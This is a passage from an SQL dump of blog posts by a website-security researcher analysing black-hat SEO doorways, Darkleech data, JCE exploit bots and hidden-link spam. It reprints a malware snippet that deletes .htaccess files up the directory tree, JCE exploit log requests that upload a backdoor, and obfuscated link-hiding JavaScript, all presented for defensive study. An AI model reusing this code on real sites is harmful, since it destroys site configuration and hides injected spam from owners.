pharma site), which was registered only a few days ago on Sept 6th, 2014.But the generated text has no pharma keywords. One more hint that it’s not for search engines. Maybe it’s an intermediary landing page of some email spam campaign that just needs to redirect visitors? I saw many such landing pages on hacked sites. But it most cases they looked like the decoded version of the script — just a redirection code. Indeed why bother with sophisticated random page generator if no one (neither humans nor robots) is going to read it?3. There is also this strange piece of code:$s=\'/\';if (strtolower(substr(PHP_OS,0,3))==\'win\') $s=\"\\\\\\\\\";$d=array(\".$s\");$p=\"\";for($i=1; $i<255; $i++){$p.=\"..$s\";if (is_dir($p)){array_push($d,$p);}else{break;}}foreach($d as $p){$a=\"h\".\"tac\".\"c\".\"es\".\"s\";$a1=$p.\".$a\";$a2=$p.$a;$a3=$p.\"$a.txt\";@chmod($a1,0666);@unlink($a1);@chmod($a2,0666);@unlink($a2);@chmod($a3,0666);@unlink($a3);}What it does it tries to find an delete(!) all file with names .htaccess, htaccess and htaccess.txt in the current directory and all(!) the directories above the current.That just doesn’t make sense. Why is it trying to corrupt websites? I would understand if it only removed its own files and injected code in legitimate files, but it tries to just remove every .htaccess (and its typical backups) without checking what’s inside. That’s a really disruptive and annoying behavior given that many sites rely on the settings in .htaccess (e.g. most WordPress and Joomla sites).It’s indeed a most contradictive doorway generator that I ever seen. I can’t find any good explanation why it does things the way it does. Maybe you have any ideas?Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for SpammersHtaccess Redirect to Example.ru/dir/index.phpIntroduction to Website Parasites                                                                                  Tags: doorway htaccess redirect                                                    			                                            « Google -> Doorway -> Google -> Spam                Darkleech Update – November 2014 »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/09/12/most-contradictive-doorway-generator/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (34, 'Google -> Doorway -> Google -> Spam', 'unmask', '11 Jun 14', 'Loading site search ...          			                Google -> Doorway -> Google -> Spam                          11 Jun 14   Filed in Uncategorized                Just a few thoughts about an interesting behavior of a black-hat SEO doorway.Typically hackers create doorways on compromised sites to make search engines rank them for certain keywords and then, when searchers click on the links in search results, those doorways redirect them further to a site that hackers really promote. Sometime that redirect may go through some TDS (traffic directing service) but the whole scheme remains pretty much the same:Search results -> doorway -> beneficiary siteToday, when doing a backlink research of one of such pharma doorways, I encountered a different scheme — a one with a loop.The doorway had this URL structure:http://www.hacked-site.com/blog/?prednisolone-without-prescriptionWhen I checked it in Unmask Parasites or in Google cache, I saw spammy content with links to doorways on other hacked sites. Quite typical.When I opened that page in a web browser, it redirected to a TDShxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&gdw=w-48&gdf=%2F90dc16aaf3e24ea68c94c3f784a37ff9-f08f149982bf04ffaa308aba00b2d569.txt&host=www.hacked-site.com&kw=prednisolone%20without%20prescription&HTTP_REFERER=https%3A%2F%2Fwww.google.com%2F%3Fsource%3Dnoref%26q%3Dprednisolone%2520without%2520prescriptionCloaking and conditional redirects to traffic directing services are also quite typical for doorways.Then TDS made another hop:hxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&seoref=8bB06MP5xFTR3TkqmNILbbW5mW30f%2B%2FMiQdbatwxiv5CUUTkQjEO75VtTs7IRqdVTmPfmX……..2FIXHlBdqV6iDd1ruYQMhqmYVCozdkTrAN76fOABiczAnd then I ended up on … Google:http://www.google.com/search?q=prednisolone+without+prescriptionAnd that is not very typical. But interesting.One one hand, it looks like the spammers didn’t consider me as a target traffic (probably because of my IP) and redirected back to the Google search results page for the same query that I supposed to be using when found that site. For some, this chain of redirects may look as if they clicked on a search result and then Google thought for some time and reloaded the same page, which may look like just a glitch.On the other hand, it looks like a second level of search engine optimization, when spammers fine tune a search query that may return better doorways. I can’t help thinking about this because when I see the search results on Google pages that the TDS redirects me to, I realize that most of them are doorways on hacked sites (yes, including those with fake stars in ratings).I know, it’s quite pointless. Why redirect people who already clicked on your doorway to a new set of search results? Although those results may contain some of your other doorways, there is no guarantee that the searcher will not go away or click on them and not on links of your competitors? And you can’t control Google search results — it may happen that there will be no your doorways on the results page.OK. Let’s try to think as the TDS owners. The TDS recognizes the traffic that it doesn’t need for the pharma campaign. It mayredirect it to pharma landing pages anyway (which may decrease the quality and the price of such a traffic)dispose of that traffic altogether (redirect it to a neutral third-party site, like Google)try to monetize that traffic anyway — redirect it to some scam site, porn site, malware site or any other resource that knows how to take advantage of low quality traffic.<warning:unfounded speculation>But what it the spammers also run another campaign that targets the traffic that doesn’t fit their pharma campaign? They can simply redirect the traffic to landing pages of the second campaign. But such traffic will not be targeted. People searched for different things. So maybe it is worth it to “re-target” the traffic and redirect the searchers to a Google result page for keywords relevant to that second campaign and that contains links to their doorways.Here’s the scenario:People search something on Google and click on some result. For some reason Google reloads the page and shows them completely different results for a different query. Some searchers will definitely leave (don’t worry, this was unwanted traffic anyway) but some may become interested in what Google offers them and click on results (after all spammers usually promote something that people need and if it comes from Google it looks more legit). So, instead of either lost or untargeted traffic, they get targeted traffic of people who willingly clicked on search results. All they need to do is make sure their doorways dominate for relevant search queries (shouldn’t be hard since the TDS provide the search query itself and there is no need to rank for short generic queries.)</warning:unfounded speculation>OK, enough speculations. That particular campaign was not using the second level Google optimization. It simply dumped unneeded traffic back to Google. When opening the same doorways from different country IPs, the TDS redirected me to a random “Canadian Pharmacy” site from its pool of about a dozen of sites.Anyway, the point of this post is despite of Matt Cutts’ recent announcement of rolling out the second ranking update for “very spammy queries” I still see that 50% or more of top search results for pharma keywords still point to doorways on hacked sites.This past weekend we started rolling out a ranking update for very spammy queries: http://t.co/NpUZRqpnBI— Matt Cutts (@mattcutts) May 21, 2014And as long as “very spammy queries” return “very spammy results”, there will be incentive for black hat SEOs to hack sites and create doorways there.Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesIntroduction to Website Parasites                                                                                  Tags: black hat seo doorway TDS                                                    			                                            « Working With the Darkleech Bitly Data                Most Contradictive Doorway Generator »            			    Reader\'s Comments (2)       	        			        			SearchCap: Google PayDay Loan 3.0, Bing Ads URL Tagging & World Cup Fever | 12 Jun 2014 9:14 pm 						[…] Google -> Doorway -> Google -> Spam, Unmask Parasites. Blog. […]                   			        			Rosanne & Jerry Shalf | 03 Dec 2014 6:27 pm 						I keep getting redirected to a Canadian drugstore site when I type in ashlandmuseum.org. Before the Canadian drugstore site pops up I see something that looks like tds….etc. but it quickly moves to the Canadian site, so I don’t know the complete set of letters.  I have a macbook pro 2012 and am using Maverick 10.9.5 OS.  It doesn’t always happen, which is weird, and it only happens on my computer, not others.  It happens when I use Firefox and Safari.  How do I get rid of it?  I had Applecare go through the machine and we got rid of various viruses, but we couldn’t fix this one.  Applecare said it was because of something Google did and only Google can fix, but I can’t figure out how to reach Google and ask for help.  Please, somebody, help me!!', '', 'http://blog.unmaskparasites.com/2014/06/11/google-doorway-google-spam/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (35, 'Working With the Darkleech Bitly Data', 'unmask', '10 Feb 14', 'Loading site search ...          			                Working With the Darkleech Bitly Data                          10 Feb 14   Filed in General                Data Driven Security took the time to analyze the raw data that I published in my recent post on Sucuri blog about how I used Bitly data to understand the scale of the Darkleech infection.In their article, they have a few questions about data formats, meaning of certain fields and some inconsistencies, so I’ll try to answer their questions here and explain how I worked with the data.So I needed to get information about all the links of the “grantdad” bitly account.I checked the API and somehow missed the “link_history” API request (it was the first time I worked with the bitly API), so I decided to screenscrape the web pages where bitly listed the links creaded by grantdad. 1,000 pages with 10 links on each. Since pages didn’t contain all the information I needed I only collected the short links so that I could use them later in API calls to get more detailed information about each of them.As you can see I was limited with the 10,000 links that bitly made available via their web interface. Not sure if I could get more links via that link_history API. Right now it returns “ACCOUNT_SUSPENDED” and when it was not suspended, API calls for known links beyond those 10,000 produced various errors.When I compiled my list of 10,000 links I used the following API calls to get information about each of the links:Referring domainsAPI:link/referring_domains — for each link, it returned a list of domains referring traffic to this link (in our case sites, containing the iframes) along with the number of clicks from each domain. This helped me compile this list of iframe loads per domain: http://pastebin.com/HYaY2yMb. Then I tried to resolve each of the domain names and created this list of infected domains per IP address: http://pastebin.com/Gxr51Nc1.I also used this API call to get number of iframe loads for each bitly link.InfoAPI:link/info – this gave me timestamps of the links and their long URLs (the rest information was not interesting for my research). Unfortunately, this particular API call is poorly documented so I can only guess what this timestamp mean. It is actually called “indexed“. But I guess it’s the time when the link was created. It is definiteley not the time of the first click because there were no registered clicks for many of the links. As a result, I compiled these datasets:http://pastebin.com/UmkDZZp0http://pastebin.com/w7Kq3ybV ,which contain tab separated values of “bitly link id”, “timestamp”, “# of clicks/iframe loads”, and “long URL”.At that point, I already had the number of iframe loads from the previous step (“link/referring_domains“). Then, for readability, I converted the numeric timestamp using this Python function datetime.datetime.fromtimestamp(). However, you can notice that the second dataset (for January 28th) has a different date format. Instead of “2014-01-25 19:10:07” it uses “Jan 28 23:10:19“. Why? Because of pastebin.com. Because it doesn’t allow unregistered users to post more than 500Kb of data (I deliberately post such data as a guest). Removing the year from the date allowed me to save 4 bytes on each row and fit the dataset in 500Kb.Actually this 500Kb limit is the reason why I have separate pastebins for each date and only specify bitly ids instead of the full bitly links.CountriesAnd finally, API:link/countries – for each link, it returned a list of countries referring traffic to this link along with the number of clicks from those countries. This helped me compile this list of iframe loads per country http://pastebin.com/SZJMw3vx.The last dataset Feb 4-5When I wrote my blogpost on February 5th, I noticed that there were new links available on the Bitly.com grantdad acount page. I began to browse pages of his links and figured that most of the links were the same (Jan 25 and 28) but around 1,700 of them were new (late February 4th and the beginning of February 5th). I immediately repeated the same procedure that included screenscraping, and 3 API calls for each new bitly link. After that I created this new dataset http://pastebin.com/YecHzQ1W and updated the rest datasets (domains, countries, etc).Some more detailsIf you check the total numbers in these two datasets (domains) http://pastebin.com/HYaY2yMb and (countries) http://pastebin.com/SZJMw3vx you’ll see the different in total number of iframe loads: 87152 and 87269. I don’t know why. I used the same links just different API calls (referring_domains and countries) and the totals are supposed to be the same. I didn’t save the “per link” data so can’t tell exactly whether it was my error or the bitly API produces slightly inconsistent results. Anyway, the difference is neglectable for my calculations and doesn’t affect the estimations (given that I tried to underestimate when in doubt ).I didn’t check for duplicates that guys from Data Driven security found in my datasets. They must have to do with my screenscraper and the way that Bitly.com displays links in user accounts. The total number of scraped links matched the number of links that Bitly reported for the user. The extra 121 clicks that these duplicates are responsible for are so close to the 117 difference that I mentioned above so I wonder if these numbers somehow connected? Anyway, this shouldn’t affect the accuracy of the estimates either.Building the geo distribution mapFor the map, I used the Geochart from Google visualization. Since the difference in numbers of clicks for the top 3 countries and the lower half of the list was 3 orders of magnitude, I had to re-scale the data so that we could still see the difference between countries with 50 iframe loads and 2 iframe loads.. I used a square of a natural logarithm for thatMath.pow( Math.round( Math.log(i)), 2)This gave me a nice distribution from 0 to 100 and the below map.IFrame Load Geo DistributionSpeculation on the link generationAfter checking the link creation per minute-of-an-hour distribution, Bob Rudis wondered:This is either the world’s most inconsistent (or crafty) cron-job or grantdad like to press ↑ + ENTER alot.I guess, it was neither cron-job nor manual link creation. I think the [bitly] links were created on-demand. So if someone loads a page and Darkleech needs to inject an iframe then it (or rather the server it works with) generates a new bitly link. Given that this malware may lurk on a server, there may be time periods when no malicious code is being injection into any web pages across all the infected servers. At the same time, the bitly links with zero clicks may refer to page loads by various bots (including our own) when the malicious code is injected but the iframe is never loaded. On the other hand, the volume of bitly links with 0 clicks (~35%) suggests that there might really more complex link generation mechanism than a simple “on-demand” approach.Anyway, that’s great when people double check our data and try to find new interesting patterns there. Make sure to let me know (here or on the Sucuri blog) if you find more patterns and inconsistencies, or have any comments on how the Darkleech works.Related posts:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsBety.php Hack. Part 2. Black Hats in Action.Introduction to Website Parasites                                                                                  Tags: Bitly Darkleech data statistics                                                    			                                            « Invasion of JCE Bots                Google -> Doorway -> Google -> Spam »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/02/10/working-with-the-darkleech-bitly-data/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (36, 'Invasion of JCE Bots', 'unmask', '27 Jan 14', 'Loading site search ...          			                Invasion of JCE Bots                          27 Jan 14   Filed in Website exploits                Joomla has been one of the most popular CMS for a long time.  It powers a huge number of sites.  That’s great! The flip side of this fact is Joomla has been very popular for a long time and there are still very many sites that use older versions of Joomla as well as older version of Joomla components. For example, the 1.5.x branch of Joomla (2008-2010) still has a noticeable share in live Joomla sites.Old versions may work well for your site but they have multiple well known security holes, so they are the low hanging fruit for hackers. Let me show this using a real world example.JCE attackThere is a JCE component — a fancy content editor that can be found almost on every Joomla site. It has a well known security hole that allows anyone to upload arbitrary files to a server.You can easily find a working exploit code for this vulnerability.  What it does is:Checks whether a vulnerable version of JCE is installed (2.0.11, 2.0.12, 2.0.13, 2.0.14, 2.0.15, 1.5.7.10, 1.5.7.11, 1.5.7.12, 1.5.7.13, 1.5.7.14)Exploits the bug in the JCE image manager to upload a PHP file with a .gif extenstion to the images/stories directoryThen uses a JSON command to rename the .gif file to *.php.Now you have a backdoor on a server and can do whatever you want with the site.This is how this attack looks in logs (real example):197.205.70.37 - - [23/Jan/2014:16:46:54 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.0\" 200 302 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20 HTTP/1.0\" 200 329 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"GET /images/stories/3xp.php HTTP/1.0\" 200 465 \"-\" \"BOT/0.1 (BOT for JCE)\"As I mentioned, JCE is a very popular component and there are still many sites that use old versions of this component. No wonder, hackers are scanning the Internet for such vulnerable sites.  They reworked the exploit code for use in their automated tools that relentlessly test millions of sites, one by another.  These days, I can find multiple requests with the “BOT/0.1 (BOT for JCE)” User-Agent string in logs of almost every site that I check, even in logs of sites that have never had Joomla installed.I’d like to share some interesting statistics of a real site that had been hacked using this JCE hole and then was being routinely reinfected every day.7,409 requests with the User-Agent “BOT/0.1 (BOT for JCE)” that came from 785 different IPs during the period of Dec 24th – Jan 24th (one month)239 requests from 51 unique IP addresses during the last 24 hours4 independent (uploaded different types of backdoors) successful infections during one day.plus, multiple tests for other vulnerabilities.To webmastersAs you can see,  this is something that you can’t neglect or consider an insignificant threat.  It’s silly to hope that hackers won’t find your site. Today hackers have resources to spider the Internet almost as efficiently as Google just about 10 years ago, so there is almost no chance your site will stay unnoticed. The only way to prevent the hacks is to be proactive:  keep all software up-to-date and harden your sites.In case of this particular JCE attack:Make sure to upgrade your Joomla site to the most current version.Upgrade JCE to the latest version. You can find download packages for all the three branches of Joomla here.Protect all file upload directories and all directories that shouldn’t contain .php files. For example, place the following .htaccess file there to prevent execution of PHP files:<Files *.php>deny from all</Files>Try blocking requests with the “BOT/0.1 (BOT for JCE)” User-Agent string.  Of course, this shouldn’t be considered as a real protection. Hackers can change the User-Agent string to whatever they want. But it can help keep some dumb annoying bots away from your site.If, for some reason, you can’t upgrade your site at this moment, consider placing it behind a website firewall that will block any malicious traffic before it reaches your server.  This is something that we call virtual patching in Sucuri CloudProxy.                                                                                  Tags: exploit JCE Joomla                                                    			                                            « Reporting Suspicious Styles                Working With the Darkleech Bitly Data »            			    Reader\'s Comments (8)       	        			        			Jim Walker | 28 Jan 2014 5:47 pm 						Nicely done!The JCI component “problem” and has been a thorn in the Joomla communities side for years.I would go so far as to say that 1/2 of all of the hacked Joomla installations I’m asked to repair are JCE exploit related.As mentioned, simply adding the .htaccess “no execute php” file within the images/stories directory generally does the trick, though upgrading is always best.Personally, for this particular exploit, I prefer the below in my .htaccess file:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shI like how you linked out to Google and known JCE exploits as well.A quality post top to bottom. Kudos!                   			        			Denis | 28 Jan 2014 7:12 pm 						Thanks Jim,That “text/plain” handler also does the trick and covers a broader range of attacks.I don’t want to link directly to exploits. But if you want to find the information, this Google search is enough. At the same time, if there is some new JCE file upload vulnerability, this search will show it too, so the link will remain fresh and useful.                   			        			machineX | 19 Sep 2014 9:05 am 						I just seen it in some logs for the second time. We do not use joomla. But I think your .htaccess code is very useful in preventative measures for sites overall.                   			        			Brian M | 20 Feb 2014 3:10 pm 						I’m curious if you would have any more information on exactly what is allowing the exploit to work? I understand it’s an exploit in code which was in an old version of Joomla, but my vBulletin sites are apparently being exploited by this Bot for JCE script. I do not have any pieces of Joomla installed on the server – at least, not that I’m aware of. Thankfully Microsoft Security Essentials is catching the backdoor/shell script being uploaded to the site and is removing it before they can use it, but it scares me that they’re able to upload the file to my site in the first place. I’ve tried to get help from vBulletin but they brush it off as not being on their end.                   			        			Denis | 11 Jun 2014 5:13 pm 						In case of Joomla JCE, it just uses a bug to upload a PHP file as a .gof and then change it’s extension to .php.If you don’t have Joomla, then you might see multiple attempts to scan your site for that JCE security hole. They do it on every site. If they find it – they exploit it, if not they move on to the next site. So what you are seeing is probably just attack attempts, not successful attacks. On the other hand, if hackers find vulnerabilities in vBulletin or any other type of site, they’ll most likely upload pretty much the same backdoors as if it was Joomla.vBulletin may be slightly different as most of it’s malware lives in its database.                   			        			JCE Joomla Extension Attacks in the Wild | Sucuri Blog | 26 Mar 2014 8:11 pm 						[…] Unmask: Invasion of JCE Bots […]                   			        			catalina | 30 Mar 2014 6:23 am 						If I understood, I have to open my .htaccess file and insert these lines:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shThats it?Which are the “collateral effects” of this?Thanks in advanceCatalina                   			        			Denis | 11 Jun 2014 5:16 pm 						This code makes web server treat such files as regular text files. I.e. instead of executing any code in them, it will just display their content in a browser as if they were plain text files.The side effect is you won’t be able to have executable scripts in those directories. But it’s the point of this trick – place it to the directories that shouldn’t have executable files', '', 'http://blog.unmaskparasites.com/2014/01/27/invasion-of-jce-bots/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (37, 'Reporting Suspicious Styles', 'unmask', '22 Nov 13', 'Loading site search ...          			                Reporting Suspicious Styles                          22 Nov 13   Filed in Unmask Parasites                Back in 2008, the very first task that I created Unmask Parasites for was scanning web pages for hidden links.I read an article about thousands of WordPress blogs being stuffed with dozens of invisible spammy links. I had a self-hosted WordPress blog too and that article made me think if there was some easy way to figure out whether my blog was hacked, something less laborious than manually examining the HTML code link by link. So I decided to create a tool that would show all domains that my web pages linked to highlighting those of them that had “invisible” styles. This approach has proved to be very efficient in identifying black hat SEO hacks. In most cases, a glance is enough to spot such problems.It works well even when the tool doesn’t highlight links as “hidden” (either because the “hiding rule” was not detected or because it scanned the “cloaked” page created specifically for search engines). You can still see the links that clearly don’t belong to your site, which tells you that something’s wrong.However, looking for suspicious links is not the bullet-proof method for detecting spam injection issues. For example, in my yesterday’s post on Sucuri blog, I wrote about fake WordPress plugins that used to injects spammy links and a JavaScript code into web pages. However, at the moment, they inject some hidden spammy auto-generated text that doesn’t have any links.You can use this Google query to reveal affected sites [cigarettes AND (“3200 unhealthy” OR “3300 hazardous”)]I don’t know why they do it, but webmasters should definitely be warned about such injections because it’s a sign of a problem that should be fixed as soon as possible. This is actually more serious than just a factor that can potentially affect site’s search ranking. Those fake plugins fetch the spammy content from remote servers and inject it into blog pages on the fly. This means that hackers can change it any time and the same moment the new spammy block will be injected into all compromised sites. Or it can be a malicious block, which makes things more serious as it will affect all visitors to those sites too.Unfortunately, such injections were not reported by Unmask Parasites since there were no links in the spammy block. After thinking about the problem, I decided that Unmask Parasites should also report pure HTML tricks such as that clip:rect style trick that hackers use to hide their injections.So , starting this week, you may see the “Suspicious Styles” section in Unmask Parasites reports.In this section, you will see excerpts of the style definitions that Unmask Parasites considers suspicious. If you see it in your site reports, then you should check the HTML code of your pages and figure out whether that style is a normal part of your pages or it was added there to hide something illicit.Note, if you can’t find such code in your web pages, it doesn’t mean it is not there. The code injection can be conditional, and server files may fetch it from a remote location (as in this case with fake WordPress plugins), or it can be encrypted. Just remember that Unmask Parasites works in real time (some results may be cached for up to an hour) and if it reports something, then you can be sure it was on a web page at the moment of scanning.To Unmask Parasites usersIf you like Unmask Parasites and want to help improve it, you can inform me about interesting tricks that hackers use to hide injected content Or send me examples of infected web pages where Unmask Parasites doesn’t report any problems.Thanks!Related posts:Unmasking “Canonical” HacksRich Snippets in Black Hat SEOIntroduction to Website Parasites                                                                                  Tags: black hat seo hidden links spam                                                    			                                            « Unmask Parasites joins Sucuri                Invasion of JCE Bots »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/11/22/reporting-suspicious-styles-2/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (38, 'Unmask Parasites joins Sucuri', 'unmask', '20 Sep 13', 'Loading site search ...          			                Unmask Parasites joins Sucuri                          20 Sep 13   Filed in Unmask Parasites                It’s official. This week Unmask Parasites joins Sucuri!Since July of 2008 when I released the first public version, Unmask Parasites was a “one man project” and it worked fine for me most of the time. I did everything myself from server setup to site development, from web attack investigations to blogging here. During these years Unmask Parasites became quite noticeable both within webmasters and Internet security community. And I always tried to meet their expectations providing a tool that could reveal various obscure website security issues and sharing information on how and why websites get hacked, and what can be done to prevent it.When Sucuri approached me and asked if I wanted to join their team as a malware researcher, I didn’t think much. I’ve been watching this company since 2010 and knew how much we had in common in our approach to Internet security. We both focus on helping site owners to detect security problems and protect their sites. We do our best to educate webmasters about things that hackers do with compromised websites — unmasking their dirty tricks is an important part of our work. In 2011 we established good relationship and began to help each other by sharing our information about ongoing massive attacks. Now Sucuri has grown to one of the leading companies in its field and makes a significant impact on how many thousands of site owners protect their sites. It’s an honor for me to join this company and the team of professionals that I know for so long time.I guess you wonder what will happen to Unmask Parasites scanner and this blog? They are here to stay! I will still be responsible for Unmask Parasites and continue to improve it and publish my blogposts here. Even better: now that I’m with Sucuri, I will have access to large volumes of data from their tools and support team (something that I really missed during the last five years), which will definitely facilitate my investigations, and, in turn, improve the quality of Unmask Parasites scanner and Sucuri own tools.For additional information check the Sucuri’s announcement.Let’s unmask parasites!Related posts:Let’s Unmask Parasites1 Million Pages Checked by Unmask Parasites!Unmask Parasites. A Year of Blogging.                                                                                  Tags: Sucuri                                                    			                                            « Analyzing [Buy Cialis] Search Results                Reporting Suspicious Styles »            			    Reader\'s Comments (2)       	        			        			Jackie McBride | 21 Sep 2013 3:36 pm 						Denis, I cannot think of anyone more deserving than you of this opportunity. Hearty congratulations & many blessings in your new venture as you go forward! & Sucuri better realize how damn lucky they are lol. From the sound of the announcement, it appears they do. Again, congratulations!                   			        			Sucuri Expands Research Efforts with Acquisition of Unmask Parasites | Sucuri Blog | 15 Sep 2014 11:50 pm 						[…] Unmask Parasites blog post […]', '', 'http://blog.unmaskparasites.com/2013/09/20/unmask-parasites-joins-sucuri/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (39, 'Analyzing [Buy Cialis] Search Results', 'unmask', '21 Aug 13', 'Loading site search ...          			                Analyzing [Buy Cialis] Search Results                          21 Aug 13   Filed in General                A few days ago I was updating the spammy word highlighting functionality  in Unmask Parasites results and needed to test the changes on real websites. To find hacked websites with spammy content I would normally google for [viagra] or [cialis], which are arguably the most targeted keywords used in black hat SEO hacks. However after the Google’s June update in how they rank web pages for spammy queries, I didn’t have much expectation of seeing hacked sites on the first page of search results for my usual [buy cialis] query and was ready to check a few more pages.We just started a new ranking update today for some spammy queries. See 2:30-3:10 of this video: http://t.co/KOMozoc3lo #smx— Matt Cutts (@mattcutts) June 11, 2013Indeed, for queries like [payday loans] I can see quite relevant results on the first three pages. All sites are specialized and don’t look like doorways on hacked sites. That’s really good. For [viagra] I found only one result on the first page pointing to a doorway on a hacked site. Still good.However, when I entered a really spammy combination [buy viagra], the search results were less than optimal — 5 out of 10 led to hacked sites. And at least 2 out of the rest 5 specialized sites were promoted using hidden links on hacked sites. Not good. And the worst results (although ideal for testing my update) were for the [buy cialis] query — 100% of results on the first page (10 out of 10) led to doorways on hacked sites or simply spammy web pages. Not a single result from websites that really have anything to do with cialis.Results analysisHere is the breakdown of the first 10 results (links go to real time Unmask Parasites reports for these pages and at the moment of writing they all reveal spammy content. However this may change over time):www.epmonthly .com/advertise/ — doorway on a hacked sitewerenotsorry .com/ — strange spammy site with a rubbish content like this “The car buy cialis in your car is the ultimate well source of electrical amazing power in your car.“incose .org/dom/ — doorway on a hacked site.www.deercrash .org/buy/cialis/online/ — doorway on a hacked sitejon-odell .com/?p=54 — doorway on a hacked sitewww.goodgrief .org .au/Cialis/ — doorway on a hacked sitewww.asm .wisc .edu/buy-cialis — doorway on a hacked sitewww.mhfa .com .au/cms/finance-home/ — doorway on a hacked sitewww .plowtoplate .org/library/51.html — doorway on a hacked sitejohn-leung .com/?p=16 — doorway on a hacked siteOver the course of the past week the results slightly fluctuated and sometimes I saw the following links on the first SERP.www.enconline .com/buycialisonline/ — doorway on a hacked sitewww.bbs-usa .com/online/ — doorway on a hacked sitewww.fabrand .com/buycialis/ — doorway on a hacked sitewww.philiptusa .com/streak/ — doorway on a hacked sitewww.clarkart.edu/authman/ — doorway on a hacked sitewww.gvhc.org/temp/index.html — doorway on a hacked sitewww.cialis-no-prescriptions.com — specialized site, but its backlink profile include many hacked sites with injected hidden links (e.g. www.aauw-nys.org)tadalafilcheap .ca/buy-cialis-online – another specialized site with a very poor backlink profile (mostly spammy off-topic forum posts).Out of 18 links that I encountered on the first page for [buy cialis] 15 point to doorways on hacked sites, 1 to a site with unreadable machine-generated text (still not sure whether it’s some SEO experiment or a backdoor with a tricky search traffic processing procedure) and 2 specialized sites relevant to the query but with quite bad backlink profiles. Overall 0% of results that follow Google’s quality guidelines.So the Google’s update for spammy queries doesn’t seem to work as it should at least for some über spammy queries.  It’s sad. And the reason why I’m sad is not that I worry about people who use such queries on Google to buy some counterfeit drugs.  My major concern is this situation justifies the huge number of sites (many thousands) that cyber-criminals hack in order to put a few of their doorways to the top for relevant queries on Google.Behind the scenesThe above 15 hacked sites that I found on the first Google’s SERP are actually only a tip of the iceberg. Each of them is being linked to from many thousands (if not millions) pages from similarly hacked sites. Here you can see a sample list of  sites that link to the above 15 (you might need a specialized tool like Unmask Parasites to see hidden and cloaked links there).Many of the hacked web pages link to more than one doorway page, which maximizes changes that one of them will be finally chosen by Google to be displayed on the first page for one of the many targeted keywords. And at the same time this helps to have a pool of alternative doorways in case some of them will be removed by webmasters or penalized by Google. As a result, the networks of doorways, landing pages and link pages can be very massive. Here you can see a list with just a small part of spammy links (338 unique domains) that can be found  on hacked web pages..gov, .edu and .orgAmong those hacked sites you can find sites of many reputable organizations, which most likely greatly help to rank well on Google. There are many compromised sites of professional associations, universities and even governmental sites, for example (as of August 19th, 2013):www.volunteer.gov/sec/spb.ca.gov/status/www.takepride.gov/index.htmlVolume of spammy backlinksIf you take some of the top results and check their backlink profiles (I used Majestic SEO Site Explorer), you’ll see how many domains can be compromised (or spammed) just in one black hat SEO campaign. And we know that there are many ongoing competing campaigns just for “cialis” search traffic, so you can imaging the overall impact.On the above screenshot you can see that thousands of domains linking to “www .epmonthly .com/advertise/” using various “cialis” keywords.The situation with “www. epmonthly .com/advertise/” is quite interesting. If you google for [“www.epmonthly .com/advertise/”] you’ll see more than a million results pointing to web pages where spammers used automated tools to post spammy links (including this one) in comments, profiles , etc. but failed to verify whether those sites accept the HTML code they were posting (still many sites, while escaping the HTML code, automatically make all URLs clickable, so those spammers finally achive their goal) .Typical black hat SEO tricksIn addition to annoying but pretty harmless comment spamming, forum spamming and creating fake user profiles, black hats massively hack websites with established reputation and turn them into their SEO assets.Spammy linksThe most common use for a hacked site is injecting links pointing to promoted resources (it can be a final landing page, or a doorway, or an intermediary site with links). Here is what such web pages may look like in Unmask Parasites reports:To hide such links from site owners, hackers make them hidden. For example, they can place them in an off-screen <div><div style=\"position:absolute; left:-8745px;\">...spammy links here...</div>Or put them in a normal <div> and add a JavaScript to make this <div> invisible when a browser loads the page<div id=\'hideMe\'> ... spammy links here.... </div><script type=\'text/javascript\'>if(document.getElementById(\'hideMe\') != null){document.getElementById(\'hideMe\').style.visibility = \'hidden\';document.getElementById(\'hideMe\').style.display = \'none\';}</script>The JavaScript can be encrypted.e v a l(function(p,a,c,k,e,d){e=function(c){return(c<a?\"\":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!\'\'.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return\'\\\\w+\'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);return p;}(\'2.1(\\\'0\\\').5.4=\"3\";\',6,6,\'bestlinks|getElementById|document|none|display|style\'.split(\'|\'),0,{}))which translates todocument.getElementById(\'bestlinks\').style.display=\"none\";where “bestlinks” is the id of the <div> with spammy links.Sometimes, encrypted JavaScript can be coupled with dynamic HTML generation of the link 